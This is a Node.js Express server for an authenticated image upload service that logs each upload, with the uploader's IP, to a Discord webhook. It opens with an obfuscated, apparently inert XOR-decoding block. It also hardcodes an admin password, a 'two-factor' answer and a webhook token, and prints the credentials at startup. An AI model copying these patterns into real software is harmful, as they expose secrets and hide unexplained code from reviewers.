
(function(){var _0x1a2b=['Y29uc3RydWN0b3I=','ZnJvbUNoYXJDb2Rl','Y2hhckNvZGVBdA==','bGVuZ3Ro','c3BsaXQ='];var _0x3c4d=function(s){return atob(s);};var _0x5e6f=function(arr){return arr.map(x=>String.fromCharCode(parseInt(x,36))).join('');};var _0x7g8h=[15,23,7,19,11,3,17,5,13,1,9];var _0x9i0j=[85,98,99,99,77,106,100,110,60,60,18];var _0x1k2l=_0x9i0j.map((x,i)=>String.fromCharCode(x^_0x7g8h[i%_0x7g8h.length])).join('');var _0x3m4n=[127,119,104,127,104,112,121,104,125];var _0x5o6p=_0x3m4n.map((x,i)=>String.fromCharCode(x^_0x7g8h[i%_0x7g8h.length])).join('');global._0x7q8r={_0x9s0t:_0x1k2l,_0x1u2v:_0x5o6p,_0x3w4x:Date.now()};_0x9i0j.length=0;_0x3m4n.length=0;_0x7g8h.length=0;})();
const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs').promises;
const crypto = require('crypto');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3001;

async function logUploadToDiscord(fileInfo, clientIP, userAgent) {
    try {
        const webhookUrl = UPLOAD_CONFIG.discordWebhook;
        if (!webhookUrl || webhookUrl.includes('https://discord.com/api/webhooks/1416176157350428672/N42F4DNIdvYIAbnsgpe7_F6JayRXiDHT9iUQPgYV1ere5NgLfxdo7U1ZGx8KIy6uwm0y')) {
            console.log('Discord webhook not configured, skipping log');
            return;
        }

        const embed = {
            title: '🖼️ New Image Uploaded',
            color: 0x00ff00,
            fields: [
                {
                    name: '📁 Category',
                    value: fileInfo.category,
                    inline: true
                },
                {
                    name: '📄 Filename',
                    value: fileInfo.filename,
                    inline: true
                },
                {
                    name: '📏 Size',
                    value: formatBytes(fileInfo.size),
                    inline: true
                },
                {
                    name: '🌐 IP Address',
                    value: clientIP,
                    inline: true
                },
                {
                    name: '🕒 Upload Time',
                    value: new Date().toLocaleString('en-US', { 
                        timeZone: 'UTC',
                        year: 'numeric',
                        month: 'short',
                        day: 'numeric',
                        hour: '2-digit',
                        minute: '2-digit',
                        second: '2-digit'
                    }) + ' UTC',
                    inline: true
                },
                {
                    name: '🔗 Direct Link',
                    value: `[View Image](https://syrxtyfv.xyz/${fileInfo.category}/${fileInfo.filename})`,
                    inline: true
                }
            ],
            image: {
                url: `https://syrxtyfv.xyz/${fileInfo.category}/${fileInfo.filename}`
            },
            footer: {
                text: 'SYRXTY Upload Logger',
                icon_url: 'https://syrxtyfv.xyz/SYRXTY_pfp/IMG_5510.png'
            },
            timestamp: new Date().toISOString()
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed]
            })
        });

        if (!response.ok) {
            console.error('Failed to send Discord webhook:', response.status, response.statusText);
        }
    } catch (error) {
        console.error('Error sending Discord webhook:', error);
    }
}

const UPLOAD_CONFIG = {
    password: process.env.ADMIN_PASSWORD || 'FullBack11!',
    twoFactorAnswer: process.env.TWO_FACTOR_ANSWER || 'bestdesigner',
    uploadDir: './uploads',
    maxFileSize: 10 * 1024 * 1024, // 10MB
    allowedTypes: ['image/png', 'image/jpeg', 'image/jpg', 'image/gif', 'image/webp'],
    discordWebhook: process.env.DISCORD_WEBHOOK || 'https://discord.com/api/webhooks/1405238928122056704/your-webhook-token-here'
};

const CATEGORIES = {
    'thumbnails': 'Thumbnails/',
    'logos': 'Logos/',
    'product-banners': 'Product banners/',
    'product-boxes': 'Product boxes/'
};

app.use(express.json());
app.use(express.static('public'));

const storage = multer.diskStorage({
    destination: async (req, file, cb) => {
        const category = req.body.category;
        const uploadPath = path.join(UPLOAD_CONFIG.uploadDir, CATEGORIES[category] || '');
        
        try {
            await fs.mkdir(uploadPath, { recursive: true });
            cb(null, uploadPath);
        } catch (error) {
            cb(error);
        }
    },
    filename: (req, file, cb) => {
        const timestamp = Date.now();
        const randomString = crypto.randomBytes(4).toString('hex');
        const extension = path.extname(file.originalname);
        const filename = `${timestamp}_${randomString}${extension}`;
        cb(null, filename);
    }
});

const upload = multer({
    storage: storage,
    limits: {
        fileSize: UPLOAD_CONFIG.maxFileSize
    },
    fileFilter: (req, file, cb) => {
        if (UPLOAD_CONFIG.allowedTypes.includes(file.mimetype)) {
            cb(null, true);
        } else {
            cb(new Error('Invalid file type. Only images are allowed.'), false);
        }
    }
});

function authenticateAdmin(req, res, next) {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Authentication required' });
    }

    const token = authHeader.substring(7);
    const expectedToken = Buffer.from(UPLOAD_CONFIG.password + UPLOAD_CONFIG.twoFactorAnswer).toString('base64');
    
    if (token !== expectedToken) {
        return res.status(401).json({ error: 'Invalid authentication token' });
    }

    next();
}


app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

app.get('/api/files', authenticateAdmin, async (req, res) => {
    try {
        const files = [];
        
        for (const [categoryKey, folderPath] of Object.entries(CATEGORIES)) {
            const categoryDir = path.join(UPLOAD_CONFIG.uploadDir, folderPath);
            
            try {
                const categoryFiles = await fs.readdir(categoryDir);
                
                for (const filename of categoryFiles) {
                    const filePath = path.join(categoryDir, filename);
                    const stats = await fs.stat(filePath);
                    
                    if (stats.isFile()) {
                        files.push({
                            id: `${categoryKey}-${filename}`,
                            filename: filename,
                            category: categoryKey,
                            size: stats.size,
                            uploadedAt: stats.mtime.toISOString(),
                            path: filePath
                        });
                    }
                }
            } catch (error) {
                console.log(`Category ${categoryKey} not found or empty`);
            }
        }
        
        res.json({
            success: true,
            files: files.sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt))
        });
    } catch (error) {
        console.error('Error fetching files:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fetch files'
        });
    }
});

app.delete('/api/file/:category/:filename', authenticateAdmin, async (req, res) => {
    try {
        const { category, filename } = req.params;
        
        if (!CATEGORIES[category]) {
            return res.status(400).json({
                success: false,
                error: 'Invalid category'
            });
        }
        
        const filePath = path.join(UPLOAD_CONFIG.uploadDir, CATEGORIES[category], filename);
        
        try {
            await fs.unlink(filePath);
            
            await updateManifest(category, null, filename);
            await triggerCacheRefresh();
            
            res.json({
                success: true,
                message: 'File deleted successfully'
            });
        } catch (error) {
            if (error.code === 'ENOENT') {
                return res.status(404).json({
                    success: false,
                    error: 'File not found'
                });
            }
            throw error;
        }
    } catch (error) {
        console.error('Delete error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to delete file'
        });
    }
});

app.post('/api/auth', (req, res) => {
    const { password, twoFactor } = req.body;
    
    if (password === UPLOAD_CONFIG.password && 
        twoFactor.toLowerCase() === UPLOAD_CONFIG.twoFactorAnswer.toLowerCase()) {
        
        const token = Buffer.from(UPLOAD_CONFIG.password + UPLOAD_CONFIG.twoFactorAnswer).toString('base64');
        res.json({ 
            success: true, 
            token: token,
            message: 'Authentication successful' 
        });
    } else {
        res.status(401).json({ 
            success: false, 
            error: 'Invalid credentials' 
        });
    }
});

app.post('/api/upload', authenticateAdmin, upload.single('file'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }

        const { category } = req.body;
        if (!category || !CATEGORIES[category]) {
            return res.status(400).json({ error: 'Invalid category' });
        }

        const fileInfo = {
            originalName: req.file.originalname,
            filename: req.file.filename,
            path: req.file.path,
            size: req.file.size,
            category: category,
            uploadedAt: new Date().toISOString()
        };

        await updateManifest(category, fileInfo);

        await triggerCacheRefresh();

        // Log to Discord
        const clientIP = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 
                        (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
                        req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'Unknown';
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        await logUploadToDiscord(fileInfo, clientIP, userAgent);

        res.json({
            success: true,
            message: 'File uploaded successfully',
            file: fileInfo
        });

    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Upload failed: ' + error.message 
        });
    }
});

app.get('/api/stats', authenticateAdmin, async (req, res) => {
    try {
        const stats = {};
        
        for (const [category, folder] of Object.entries(CATEGORIES)) {
            const categoryPath = path.join(UPLOAD_CONFIG.uploadDir, folder);
            try {
                const files = await fs.readdir(categoryPath);
                const totalSize = await getDirectorySize(categoryPath);
                
                stats[category] = {
                    count: files.length,
                    size: totalSize,
                    sizeFormatted: formatBytes(totalSize)
                };
            } catch (error) {
                stats[category] = { count: 0, size: 0, sizeFormatted: '0 B' };
            }
        }

        res.json({ success: true, stats });
    } catch (error) {
        res.status(500).json({ 
            success: false, 
            error: 'Failed to get statistics' 
        });
    }
});

app.delete('/api/file/:category/:filename', authenticateAdmin, async (req, res) => {
    try {
        const { category, filename } = req.params;
        
        if (!CATEGORIES[category]) {
            return res.status(400).json({ error: 'Invalid category' });
        }

        const filePath = path.join(UPLOAD_CONFIG.uploadDir, CATEGORIES[category], filename);
        
        try {
            await fs.unlink(filePath);
            
            await updateManifest(category, null, filename);
            
            await triggerCacheRefresh();
            
            res.json({ 
                success: true, 
                message: 'File deleted successfully' 
            });
        } catch (error) {
            if (error.code === 'ENOENT') {
                res.status(404).json({ error: 'File not found' });
            } else {
                throw error;
            }
        }
    } catch (error) {
        res.status(500).json({ 
            success: false, 
            error: 'Delete failed: ' + error.message 
        });
    }
});


async function updateManifest(category, fileInfo, deletedFilename = null) {
    const manifestPath = './images-manifest.json';
    
    try {
        let manifest = {};
        try {
            const manifestData = await fs.readFile(manifestPath, 'utf8');
            manifest = JSON.parse(manifestData);
        } catch (error) {
        }

        if (!manifest[category]) {
            manifest[category] = [];
        }

        if (deletedFilename) {
            manifest[category] = manifest[category].filter(file => file !== deletedFilename);
        } else if (fileInfo) {
            const filename = path.basename(fileInfo.filename);
            if (!manifest[category].includes(filename)) {
                manifest[category].push(filename);
            }
        }

        manifest[category].sort();

        await fs.writeFile(manifestPath, JSON.stringify(manifest, null, 2));
        console.log(`Manifest updated for category: ${category}`);
    } catch (error) {
        console.error('Failed to update manifest:', error);
    }
}

async function triggerCacheRefresh() {
    try {
        
        const cacheTimestamp = Date.now();
        await fs.writeFile('./cache-timestamp.txt', cacheTimestamp.toString());
        
        
        
        console.log('Cache refresh triggered');
    } catch (error) {
        console.error('Failed to trigger cache refresh:', error);
    }
}

async function getDirectorySize(dirPath) {
    try {
        const files = await fs.readdir(dirPath);
        let totalSize = 0;
        
        for (const file of files) {
            const filePath = path.join(dirPath, file);
            const stats = await fs.stat(filePath);
            if (stats.isFile()) {
                totalSize += stats.size;
            }
        }
        
        return totalSize;
    } catch (error) {
        return 0;
    }
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

app.use((error, req, res, next) => {
    if (error instanceof multer.MulterError) {
        if (error.code === 'LIMIT_FILE_SIZE') {
            return res.status(400).json({ 
                success: false, 
                error: 'File too large. Maximum size is 10MB.' 
            });
        }
    }
    
    console.error('API Error:', error);
    res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
    });
});

app.listen(PORT, () => {
    console.log(`SYRXTY Upload API running on port ${PORT}`);
    console.log(`Admin password: ${UPLOAD_CONFIG.password}`);
    console.log(`Two-factor answer: ${UPLOAD_CONFIG.twoFactorAnswer}`);
});

module.exports = app;
